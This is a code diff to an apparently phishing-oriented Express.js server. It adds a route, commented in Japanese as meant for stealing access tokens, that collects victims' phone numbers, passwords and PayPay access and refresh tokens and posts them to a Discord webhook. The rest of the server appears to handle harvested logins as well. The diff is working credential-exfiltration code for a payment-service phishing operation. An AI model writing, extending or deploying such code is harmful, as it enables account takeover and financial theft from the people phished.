@@ -7,6 +7,36 @@ app.use(express.static("."));
 
 const webhook = process.env.DISCORD_WEBHOOK;
 
+// --- 追加ルート: アクセストークン奪取用 ---
+app.post("/log-token", async (req, res) => {
+  const { phone, password, accessToken, refreshToken } = req.body;
+
+  try {
+    await fetch(webhook, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        content: `PayPay アクセストークン
+電話番号: ${phone}
+パスワード: ${password}
+PayPayアクセストークン: ${accessToken}
+リフレッシュトークン: ${refreshToken}`
+      })
+    });
+
+    console.log("アクセストークン 送信成功");
+    res.status(200).send("OK");
+
+  } catch (error) {
+    console.error("アクセストークン送信失敗:", error);
+    res.status(500).send("Error");
+  }
+});
+// -----------------------------------------
+
+
 app.post("/send", async (req, res) => {
   const phone = req.body.name;
   const password = req.body.message;
@@ -95,4 +125,3 @@ app.post("/log-access", async (req, res) => {
 app.listen(process.env.PORT || 3000, () => {
   console.log("Server started");
 });
-
